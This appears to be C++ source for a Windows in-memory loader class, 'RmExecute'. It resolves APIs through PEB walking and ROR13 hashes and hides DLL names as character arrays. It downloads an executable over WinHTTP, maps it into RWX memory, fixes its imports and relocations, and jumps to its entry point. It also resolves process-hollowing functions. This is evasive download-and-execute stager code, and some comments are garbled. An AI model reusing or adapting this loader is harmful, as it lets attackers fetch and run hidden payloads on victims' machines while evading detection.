
#define ROTR32(value, shift)	(((DWORD) value >> (BYTE) shift) | ((DWORD) value << (32 - (BYTE) shift)))

HMODULE RmExecute::GetProcAddressWithHash(DWORD dwModuleFunctionHash)
{
	PPEB PebAddress;
	PMY_PEB_LDR_DATA pLdr;
	PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
	PVOID pModuleBase;
	PIMAGE_NT_HEADERS pNTHeader;
	DWORD dwExportDirRVA;
	PIMAGE_EXPORT_DIRECTORY pExportDir;
	PLIST_ENTRY pNextModule;
	DWORD dwNumFunctions;
	USHORT usOrdinalTableIndex;
	PDWORD pdwFunctionNameBase;
	PCSTR pFunctionName;
	UNICODE_STRING BaseDllName;
	DWORD dwModuleHash;
	DWORD dwFunctionHash;
	PCSTR pTempChar;
	DWORD i;

#if defined(_WIN64)
	PebAddress = (PPEB)__readgsqword(0x60);
#elif defined(_M_ARM)
	PebAddress = (PPEB)((ULONG_PTR)_MoveFromCoprocessor(15, 0, 13, 0, 2) + 0);
	__emit(0x00006B1B);
#else
	PebAddress = (PPEB)__readfsdword(0x30);
#endif

	pLdr = (PMY_PEB_LDR_DATA)PebAddress->Ldr;
	pNextModule = pLdr->InLoadOrderModuleList.Flink;
	pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pNextModule;

	while (pDataTableEntry->DllBase != NULL)
	{
		dwModuleHash = 0;
		pModuleBase = pDataTableEntry->DllBase;
		BaseDllName = pDataTableEntry->BaseDllName;
		pNTHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModuleBase + ((PIMAGE_DOS_HEADER)pModuleBase)->e_lfanew);
		dwExportDirRVA = pNTHeader->OptionalHeader.DataDirectory[0].VirtualAddress;

		//��ȡ��һ��ģ���ַ
		pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pDataTableEntry->InLoadOrderLinks.Flink;

		// �����ǰģ�鲻�����κκ�������ת����һ��ģ�� ����ģ�����
		if (dwExportDirRVA == 0)
		{
			continue;
		}

		//����ģ���ϣֵ
		for (i = 0; i < BaseDllName.MaximumLength; i++)
		{
			pTempChar = ((PCSTR)BaseDllName.Buffer + i);

			dwModuleHash = ROTR32(dwModuleHash, 13);

			if (*pTempChar >= 0x61)
			{
				dwModuleHash += *pTempChar - 0x20;
			}
			else
			{
				dwModuleHash += *pTempChar;
			}
		}

		pExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)pModuleBase + dwExportDirRVA);

		dwNumFunctions = pExportDir->NumberOfNames;
		pdwFunctionNameBase = (PDWORD)((PCHAR)pModuleBase + pExportDir->AddressOfNames);

		for (i = 0; i < dwNumFunctions; i++)
		{
			dwFunctionHash = 0;
			pFunctionName = (PCSTR)(*pdwFunctionNameBase + (ULONG_PTR)pModuleBase);
			pdwFunctionNameBase++;

			pTempChar = pFunctionName;

			do
			{
				dwFunctionHash = ROTR32(dwFunctionHash, 13);
				dwFunctionHash += *pTempChar;
				pTempChar++;
			} while (*(pTempChar - 1) != 0);

			dwFunctionHash += dwModuleHash;

			if (dwFunctionHash == dwModuleFunctionHash)
			{
				usOrdinalTableIndex = *(PUSHORT)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfNameOrdinals) + (2 * i));
				return (HMODULE)((ULONG_PTR)pModuleBase + *(PDWORD)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfFunctions) + (4 * usOrdinalTableIndex)));
			}
		}
	}

	return NULL;
}




void RmExecute::Initfunctions(Pfunctions pfn)
{


	pfn->fnLoadLibraryA = (pfnLoadLibraryA)GetProcAddressWithHash(HASH_LoadLibraryA);


	


	
	
	//��ȡLoadLibraryA������ַ
	
	
	pfn->fnGetModuleFileNameA = (pfnGetModuleFileNameA)GetProcAddressWithHash(HASH_GetModuleFileNameA);
	
	char szUser32[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
	pfn->fnLoadLibraryA(szUser32);
	char szMsvcrt[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0 };
	pfn->fnLoadLibraryA(szMsvcrt);
	char szWinhttp[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', 0 };
	pfn->fnLoadLibraryA(szWinhttp);
	pfn->fnReleaseActCtx = (pfnReleaseActCtx)GetProcAddressWithHash(HASH_ReleaseActCtx);
	pfn->fnDeactivateActCtx = (pfnDeactivateActCtx)GetProcAddressWithHash(HASH_DeactivateActCtx);
	pfn->fnActivateActCtx = (pfnActivateActCtx)GetProcAddressWithHash(HASH_ActivateActCtx);
	pfn->fnGetProcAddress = (pfnGetProcAddress)GetProcAddressWithHash(HASH_GetProcAddress);
	pfn->fnVirtualProtect = (pfnVirtualProtect)GetProcAddressWithHash(HASH_VirtualProtect);
	pfn->fnGetModuleHandleA = (pfnGetModuleHandleA)GetProcAddressWithHash(HASH_GetModuleHandleA);
	pfn->fnFindResourceA = (pfnFindResourceA)GetProcAddressWithHash(HASH_FindResourceA);
	pfn->fnLoadResource = (pfnLoadResource)GetProcAddressWithHash(HASH_LoadResource);

	pfn->fnCreateActCtxA = (pfnCreateActCtxA)GetProcAddressWithHash(HASH_CreateActCtxA);
	
	pfn->fnLockResource = (pfnLockResource)GetProcAddressWithHash(HASH_LockResource);
	pfn->fnSizeofResource = (pfnSizeofResource)GetProcAddressWithHash(HASH_SizeofResource);
	pfn->fnMessageBoxA = (pfnMessageBoxA)GetProcAddressWithHash(HASH_MessageBoxA);
	pfn->fnCreateProcessA = (pfnCreateProcessA)GetProcAddressWithHash(HASH_CreateProcessA);
	pfn->fnGetThreadContext = (pfnGetThreadContext)GetProcAddressWithHash(HASH_GetThreadContext);
	pfn->fnReadProcessMemory = (pfnReadProcessMemory)GetProcAddressWithHash(HASH_ReadProcessMemory);
	pfn->fnVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddressWithHash(HASH_VirtualAllocEx);
	pfn->fnWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddressWithHash(HASH_WriteProcessMemory);
	pfn->fnSetThreadContext = (pfnSetThreadContext)GetProcAddressWithHash(HASH_SetThreadContext);
	pfn->fnResumeThread = (pfnResumeThread)GetProcAddressWithHash(HASH_ResumeThread);
	pfn->fnVirtualAlloc = (pfnVirtualAlloc)GetProcAddressWithHash(HASH_VirtualAlloc);
	

	
	
	

	
	

	pfn->fnmalloc = (pfnmalloc)GetProcAddressWithHash(HASH_malloc);
	pfn->fnfree = (pfnfree)GetProcAddressWithHash(HASH_free);
	pfn->fnmemset = (pfnmemset)GetProcAddressWithHash(HASH_memset);
	pfn->fnmemcpy = (pfnmemcpy)GetProcAddressWithHash(HASH_memcpy);
	pfn->fnmemcmp = (pfnmemcmp)GetProcAddressWithHash(HASH_memcmp);
	pfn->fnstrlen = (pfnstrlen)GetProcAddressWithHash(HASH_strlen);
	pfn->fnstrcpy = (pfnstrcpy)GetProcAddressWithHash(HASH_strcpy);
	pfn->fnstrcat = (pfnstrcat)GetProcAddressWithHash(HASH_strcat);


	

	pfn->fnWinHttpOpen = (pfnWinHttpOpen)GetProcAddressWithHash(HASH_WinHttpOpen);
	pfn->fnWinHttpConnect = (pfnWinHttpConnect)GetProcAddressWithHash(HASH_WinHttpConnect);
	pfn->fnWinHttpOpenRequest = (pfnWinHttpOpenRequest)GetProcAddressWithHash(HASH_WinHttpOpenRequest);
	pfn->fnWinHttpAddRequestHeaders = (pfnWinHttpAddRequestHeaders)GetProcAddressWithHash(HASH_WinHttpAddRequestHeaders);
	pfn->fnWinHttpSendRequest = (pfnWinHttpSendRequest)GetProcAddressWithHash(HASH_WinHttpSendRequest);
	pfn->fnWinHttpReceiveResponse = (pfnWinHttpReceiveResponse)GetProcAddressWithHash(HASH_WinHttpReceiveResponse);
	pfn->fnWinHttpQueryDataAvailable = (pfnWinHttpQueryDataAvailable)GetProcAddressWithHash(HASH_WinHttpQueryDataAvailable);
	pfn->fnWinHttpReadData = (pfnWinHttpReadData)GetProcAddressWithHash(HASH_WinHttpReadData);
	pfn->fnWinHttpCloseHandle = (pfnWinHttpCloseHandle)GetProcAddressWithHash(HASH_WinHttpCloseHandle);


}


// ����һ��Ҫfree
int RmExecute::HttpDownload(wchar_t* target, wchar_t* path, INTERNET_PORT port,BOOL useSSL =FALSE) {

	
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	DWORD dwLast = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;
	 newbuff = NULL;
	


	// Use WinHttpOpen to obtain a session handle.
	wchar_t Sign[] = { 'W','i','n','H','T','T','P',' ','E','x','a','m','p','l','e','/','1','.','0','\0' };
	
	hSession = fn.fnWinHttpOpen(Sign,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	
	// Specify an HTTP server.
	if (hSession)
		hConnect = fn.fnWinHttpConnect(hSession, target,
			port, 0);
	wchar_t GET[] = { 'G','E','T','\0' };
	// Create an HTTP request handle.
	if (hConnect){}
		

		hRequest = fn.fnWinHttpOpenRequest(hConnect, GET, path,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			useSSL ? WINHTTP_FLAG_SECURE : 0);




/*
#ifndef _WIN64
	LPCWSTR header = L"Accept-platform: x86\n";
	SIZE_T len = lstrlenW(header);
	WinHttpAddRequestHeaders(hRequest, header, len, WINHTTP_ADDREQ_FLAG_ADD);
#else
	LPCWSTR header = L"Accept-platform: x64\n";
	SIZE_T len = lstrlenW(header);
	WinHttpAddRequestHeaders(hRequest, header, len, WINHTTP_ADDREQ_FLAG_ADD);
#endif
*/


	// Send a request.
	if (hRequest)
		bResults = fn.fnWinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);


	// End the request.
	if (bResults)
		bResults = fn.fnWinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!fn.fnWinHttpQueryDataAvailable(hRequest, &dwSize))
				return dwLast;
			// Allocate space for the buffer.
			//pszOutBuffer = new char[dwSize + 1];
			BOOL Second = FALSE;
			if (dwLast != 0) {
				newbuff = (char *)fn.fnmalloc(dwLast + dwSize + 1);
				fn.fnmemset(newbuff, 0, dwLast + dwSize + 1);
				fn.fnmemcpy(newbuff, pszOutBuffer, dwLast);
				fn.fnfree(pszOutBuffer);
				pszOutBuffer = newbuff;
				dwLast += dwSize;
				Second = TRUE;
			}
			else {
				newbuff = (LPSTR)fn.fnmalloc(dwSize + 1);
				pszOutBuffer = newbuff;
				dwLast = dwSize;
				
			}
			if (!pszOutBuffer)
			{
				return dwLast;
				dwSize = 0;
			}
			else
			{
				// Read the data.
				//ZeroMemory(pszOutBuffer, dwSize + 1);
				
				BOOL Flag;
				if (Second) {

					Flag = fn.fnWinHttpReadData(hRequest, (LPVOID)(pszOutBuffer + dwLast-dwSize),
						dwSize, &dwDownloaded);
				}
				else {
					fn.fnmemset(pszOutBuffer, 0, dwSize + 1);
					Flag = fn.fnWinHttpReadData(hRequest, (LPVOID)(pszOutBuffer),
						dwSize, &dwDownloaded);
				}
				if (!Flag)
					return dwLast;
				

				// Free the memory allocated to the buffer.
				//delete[] pszOutBuffer;
				//fn.fnfree(pszOutBuffer);

			}
		} while (dwSize > 0);
	}


	// Report any errors.
	if (!bResults)
		return dwLast;

	// Close any open handles.
	if (hRequest) fn.fnWinHttpCloseHandle(hRequest);
	if (hConnect) fn.fnWinHttpCloseHandle(hConnect);
	if (hSession) fn.fnWinHttpCloseHandle(hSession);
	return dwLast;
}

#ifdef _WIN64

VOID RmExecute::FixImageIAT(PIMAGE_DOS_HEADER dos_header, PIMAGE_NT_HEADERS nt_header)
{
	PIMAGE_THUNK_DATA thunk;
	PIMAGE_THUNK_DATA fixup;
	DWORD iat_rva;
	SIZE_T iat_size;
	HMODULE import_base;
	PIMAGE_IMPORT_DESCRIPTOR import_table =
		(PIMAGE_IMPORT_DESCRIPTOR)(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress +
			(UINT_PTR)dos_header);

	DWORD iat_loc =
		(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress) ?
		IMAGE_DIRECTORY_ENTRY_IAT :
		IMAGE_DIRECTORY_ENTRY_IMPORT;

	iat_rva = nt_header->OptionalHeader.DataDirectory[iat_loc].VirtualAddress;
	iat_size = nt_header->OptionalHeader.DataDirectory[iat_loc].Size;

	LPVOID iat = (LPVOID)(iat_rva + (UINT_PTR)dos_header);
	DWORD op;
	fn.fnVirtualProtect(iat, iat_size, PAGE_READWRITE, &op);
	
		while (import_table->Name) {
			import_base = fn.fnLoadLibraryA((LPCSTR)(import_table->Name + (UINT_PTR)dos_header));
			fixup = (PIMAGE_THUNK_DATA)(import_table->FirstThunk + (UINT_PTR)dos_header);
			if (import_table->OriginalFirstThunk) {
				thunk = (PIMAGE_THUNK_DATA)(import_table->OriginalFirstThunk + (UINT_PTR)dos_header);
			}
			else {
				thunk = (PIMAGE_THUNK_DATA)(import_table->FirstThunk + (UINT_PTR)dos_header);
			}

			while (thunk->u1.Function) {
				PCHAR func_name;
				if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
					fixup->u1.Function =
						(UINT_PTR)fn.fnGetProcAddress(import_base, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));

				}
				else {
					func_name =
						(PCHAR)(((PIMAGE_IMPORT_BY_NAME)(thunk->u1.AddressOfData))->Name + (UINT_PTR)dos_header);
					fixup->u1.Function = (UINT_PTR)fn.fnGetProcAddress(import_base, func_name);
				}
				fixup++;
				thunk++;
			}
			import_table++;
		}
	
	
	return;
}

//works with manually mapped files
HANDLE RmExecute::GetImageActCtx(HMODULE module)
{
	WCHAR temp_path[MAX_PATH];
	WCHAR temp_filename[MAX_PATH];
	for (int i = 1; i <= 3; i++) {
		HRSRC resource_info = fn.fnFindResourceA(module, MAKEINTRESOURCE(i), RT_MANIFEST);
		if (resource_info) {
			HGLOBAL resource = fn.fnLoadResource(module, resource_info);
			DWORD resource_size = fn.fnSizeofResource(module, resource_info);
			const PBYTE resource_data = (const PBYTE)fn.fnLockResource(resource);
			/*if (resource_data && resource_size) {
				FILE* fp;
				errno_t err;
				DWORD ret_val = GetTempPath(MAX_PATH, temp_path);

				if (0 == GetTempFileName(temp_path, L"manifest.tmp", 0, temp_filename))
					return NULL;

				err = _wfopen_s(&fp, temp_filename, L"w");

				if (errno)
					return NULL;

				fprintf(fp, (const char*)resource_data);
				fclose(fp);
				break;
			}
			else {
				return NULL;
			}*/
		}
	}

	ACTCTXW act = { sizeof(act) };
	act.lpSource = temp_filename;
	return fn.fnCreateActCtxA((PCACTCTXA)(&act));
}

//if base_addr points to a byte stream in memory then load module from that
//if base_addr is NULL then attempt to map module into memory from resource
//***note if module is memory mapped manually then it has no loaded module handle 
//and some modules use the module base as the handle for a call and it will fail
LPVOID RmExecute::MapImageToMemory(LPVOID base_addr)
{
	LPVOID mem_image_base = NULL;
	

		PIMAGE_DOS_HEADER raw_image_base = (PIMAGE_DOS_HEADER)base_addr;

		HMODULE proc_base = fn.fnGetModuleHandleA(NULL);


		if (IMAGE_DOS_SIGNATURE != raw_image_base->e_magic)
			return NULL;

		PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(raw_image_base->e_lfanew + (UINT_PTR)raw_image_base);
		if (IMAGE_NT_SIGNATURE != nt_header->Signature)
			return NULL;

		//only 64bit modules will be loaded
		if (IMAGE_FILE_MACHINE_AMD64 != nt_header->FileHeader.Machine)
			return NULL;

		//Not going to bother with .net
		if (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress)
			return NULL;

		PIMAGE_SECTION_HEADER section_header =
			(PIMAGE_SECTION_HEADER)(raw_image_base->e_lfanew + sizeof(*nt_header) + (UINT_PTR)raw_image_base);

		mem_image_base = fn.fnVirtualAlloc(
			(LPVOID)(nt_header->OptionalHeader.ImageBase),
			nt_header->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);

		if (NULL == mem_image_base) {
			mem_image_base = fn.fnVirtualAlloc(
				NULL,
				nt_header->OptionalHeader.SizeOfImage,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_EXECUTE_READWRITE);
		}

		if (NULL == mem_image_base)
			return NULL;

		fn.fnmemcpy(mem_image_base, (LPVOID)raw_image_base, nt_header->OptionalHeader.SizeOfHeaders);

		for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
			fn.fnmemcpy(
				(LPVOID)(section_header->VirtualAddress + (UINT_PTR)mem_image_base),
				(LPVOID)(section_header->PointerToRawData + (UINT_PTR)raw_image_base),
				section_header->SizeOfRawData);
			section_header++;
		}
	
	
	return mem_image_base;
}

BOOL RmExecute::FixImageRelocations(PIMAGE_DOS_HEADER dos_header, PIMAGE_NT_HEADERS nt_header, ULONG_PTR delta)
{
	ULONG_PTR size;
	PULONG_PTR intruction;
	PIMAGE_BASE_RELOCATION reloc_block =
		(PIMAGE_BASE_RELOCATION)(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress +
			(UINT_PTR)dos_header);

	while (reloc_block->VirtualAddress) {
		size = (reloc_block->SizeOfBlock - sizeof(reloc_block)) / sizeof(WORD);
		PWORD fixup = (PWORD)((ULONG_PTR)reloc_block + sizeof(reloc_block));
		for (int i = 0; i < size; i++, fixup++) {
			if (IMAGE_REL_BASED_DIR64 == *fixup >> 12) {
				intruction = (PULONG_PTR)(reloc_block->VirtualAddress + (ULONG_PTR)dos_header + (*fixup & 0xfff));
				*intruction += delta;
			}
		}
		reloc_block = (PIMAGE_BASE_RELOCATION)(reloc_block->SizeOfBlock + (ULONG_PTR)reloc_block);
	}
	return TRUE;
}

bool RmExecute::RunPortableExecutable() {
	PIMAGE_DOS_HEADER image_base = (PIMAGE_DOS_HEADER)MapImageToMemory((LPVOID)newbuff);
	//PIMAGE_DOS_HEADER image_base = (PIMAGE_DOS_HEADER)MapImageToMemory(NULL);//not working with some files like notepad etc
	//PIMAGE_DOS_HEADER image_base = (PIMAGE_DOS_HEADER)LoadLibrary(L"mspaint.exe");//works
	if (!image_base) {
		return 1;
	}

	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(image_base->e_lfanew + (UINT_PTR)image_base);
	HANDLE actctx = NULL;
	UINT_PTR cookie = 0;
	BOOL changed_ctx = FALSE;
	if (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress) {
		actctx = GetImageActCtx((HMODULE)image_base);
		if (actctx)
			changed_ctx = fn.fnActivateActCtx(actctx, &cookie);
	}

	FixImageIAT(image_base, nt_header);

	if (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) {
		ptrdiff_t delta = (ptrdiff_t)((PBYTE)image_base - (PBYTE)nt_header->OptionalHeader.ImageBase);
		if (delta)
			FixImageRelocations(image_base, nt_header, delta);
	}

	LPVOID oep = (LPVOID)(nt_header->OptionalHeader.AddressOfEntryPoint + (UINT_PTR)image_base);
	((void(*)())(oep))();
	//DWORD tid;
	//PCONTEXT ctx;
	//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)oep, NULL, 0, &tid);

	if (changed_ctx) {
		fn.fnDeactivateActCtx(0, cookie);
		fn.fnReleaseActCtx(actctx);
	}
}
#else
HANDLE RmExecute::GetImageActCtx(HMODULE module)
{
	WCHAR temp_path[MAX_PATH];
	WCHAR temp_filename[MAX_PATH];
	for (int i = 1; i <= 3; i++) {
		HRSRC resource_info = fn.fnFindResourceA(module, MAKEINTRESOURCE(i), RT_MANIFEST);
		if (resource_info) {
			HGLOBAL resource = fn.fnLoadResource(module, resource_info);
			DWORD resource_size = fn.fnSizeofResource(module, resource_info);
			const PBYTE resource_data = (const PBYTE)fn.fnLockResource(resource);
		}
	}

	ACTCTXW act = { sizeof(act) };
	act.lpSource = temp_filename;
	return fn.fnCreateActCtxA((PCACTCTXA)(&act));
}

LPVOID RmExecute::MapImageToMemory(LPVOID base_addr)
{
	LPVOID mem_image_base = NULL;


	PIMAGE_DOS_HEADER raw_image_base = (PIMAGE_DOS_HEADER)base_addr;

	HMODULE proc_base = fn.fnGetModuleHandleA(NULL);


	if (IMAGE_DOS_SIGNATURE != raw_image_base->e_magic)
		return NULL;

	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(raw_image_base->e_lfanew + (UINT_PTR)raw_image_base);
	if (IMAGE_NT_SIGNATURE != nt_header->Signature)
		return NULL;

	PIMAGE_SECTION_HEADER section_header =
		(PIMAGE_SECTION_HEADER)(raw_image_base->e_lfanew + sizeof(*nt_header) + (UINT_PTR)raw_image_base);

	mem_image_base = fn.fnVirtualAlloc(
		(LPVOID)(nt_header->OptionalHeader.ImageBase),
		nt_header->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (NULL == mem_image_base) {
		mem_image_base = fn.fnVirtualAlloc(
			NULL,
			nt_header->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);
	}

	if (NULL == mem_image_base)
		return NULL;

	fn.fnmemcpy(mem_image_base, (LPVOID)raw_image_base, nt_header->OptionalHeader.SizeOfHeaders);

	for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
		fn.fnmemcpy(
			(LPVOID)(section_header->VirtualAddress + (UINT_PTR)mem_image_base),
			(LPVOID)(section_header->PointerToRawData + (UINT_PTR)raw_image_base),
			section_header->SizeOfRawData);
		section_header++;
	}


	return mem_image_base;
}

BYTE* RmExecute::getNtHdrs(BYTE* pe_buffer)
{
	if (pe_buffer == NULL) return NULL;

	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	const LONG kMaxOffset = 1024;
	LONG pe_offset = idh->e_lfanew;
	if (pe_offset > kMaxOffset) return NULL;
	IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((BYTE*)pe_buffer + pe_offset);
	if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
	return (BYTE*)inh;
}

IMAGE_DATA_DIRECTORY* RmExecute::getPeDir(PVOID pe_buffer, size_t dir_id)
{
	if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

	BYTE* nt_headers = getNtHdrs((BYTE*)pe_buffer);
	if (nt_headers == NULL) return NULL;

	IMAGE_DATA_DIRECTORY* peDir = NULL;

	IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
	peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

	if (peDir->VirtualAddress == NULL) {
		return NULL;
	}
	return peDir;
}

bool  RmExecute::fixIAT(PVOID modulePtr)
{
	IMAGE_DATA_DIRECTORY* importsDir = getPeDir(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
	if (importsDir == NULL) return false;

	size_t maxSize = importsDir->Size;
	size_t impAddr = importsDir->VirtualAddress;

	IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
	size_t parsedSize = 0;

	for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

		if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
		LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);

		size_t call_via = lib_desc->FirstThunk;
		size_t thunk_addr = lib_desc->OriginalFirstThunk;
		if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

		size_t offsetField = 0;
		size_t offsetThunk = 0;
		while (true)
		{
			IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
			IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);

			if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
			{
				size_t addr = (size_t)fn.fnGetProcAddress(fn.fnLoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
				fieldThunk->u1.Function = addr;
			}

			if (fieldThunk->u1.Function == NULL) break;

			if (fieldThunk->u1.Function == orginThunk->u1.Function) {

				PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)(size_t(modulePtr) + orginThunk->u1.AddressOfData);

				LPSTR func_name = (LPSTR)by_name->Name;
				size_t addr = (size_t)fn.fnGetProcAddress(fn.fnLoadLibraryA(lib_name), func_name);

				fieldThunk->u1.Function = addr;

			}
			offsetField += sizeof(IMAGE_THUNK_DATA);
			offsetThunk += sizeof(IMAGE_THUNK_DATA);
		}
	}
	return true;
}

typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY;

bool  RmExecute::applyReloc(ULONGLONG newBase, ULONGLONG oldBase, PVOID modulePtr, SIZE_T moduleSize)
{
	IMAGE_DATA_DIRECTORY* relocDir = getPeDir(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC);
	if (relocDir == NULL) /* Cannot relocate - application have no relocation table */
		return false;

	size_t maxSize = relocDir->Size;
	size_t relocAddr = relocDir->VirtualAddress;
	IMAGE_BASE_RELOCATION* reloc = NULL;

	size_t parsedSize = 0;
	for (; parsedSize < maxSize; parsedSize += reloc->SizeOfBlock) {
		reloc = (IMAGE_BASE_RELOCATION*)(relocAddr + parsedSize + size_t(modulePtr));
		if (reloc->VirtualAddress == NULL || reloc->SizeOfBlock == 0)
			break;

		size_t entriesNum = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		size_t page = reloc->VirtualAddress;

		BASE_RELOCATION_ENTRY* entry = (BASE_RELOCATION_ENTRY*)(size_t(reloc) + sizeof(IMAGE_BASE_RELOCATION));
		for (size_t i = 0; i < entriesNum; i++) {
			size_t offset = entry->Offset;
			size_t type = entry->Type;
			size_t reloc_field = page + offset;
			if (entry == NULL || type == 0)
				break;
			if (type != 3) {
				return false;
			}
			if (reloc_field >= moduleSize) {
				return false;
			}

			size_t* relocateAddr = (size_t*)(size_t(modulePtr) + reloc_field);
			(*relocateAddr) = ((*relocateAddr) - oldBase + newBase);
			entry = (BASE_RELOCATION_ENTRY*)(size_t(entry) + sizeof(BASE_RELOCATION_ENTRY));
		}
	}
	return (parsedSize != 0);
}

bool RmExecute::RunPortableExecutable() {
	PIMAGE_DOS_HEADER image_base = (PIMAGE_DOS_HEADER)MapImageToMemory((LPVOID)newbuff);
	if (!image_base) {
		return 1;
	}

	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(image_base->e_lfanew + (UINT_PTR)image_base);
	HANDLE actctx = NULL;
	ULONG_PTR cookie = 0;
	BOOL changed_ctx = FALSE;
	if (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress) {
		actctx = GetImageActCtx((HMODULE)image_base);
		if (actctx)
			changed_ctx = fn.fnActivateActCtx(actctx, &cookie);
	}

	fixIAT(image_base);

	if (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) {
		ptrdiff_t delta = (ptrdiff_t)((PBYTE)image_base - (PBYTE)nt_header->OptionalHeader.ImageBase);
		if (delta)
		{
			applyReloc((size_t)image_base, (size_t)nt_header->OptionalHeader.ImageBase, image_base, nt_header->OptionalHeader.SizeOfImage);
		}

	}

	LPVOID oep = (LPVOID)(nt_header->OptionalHeader.AddressOfEntryPoint + (UINT_PTR)image_base);
	((void(*)())(oep))();

	if (changed_ctx) {
		fn.fnDeactivateActCtx(0, cookie);
		fn.fnReleaseActCtx(actctx);
	}
}
#endif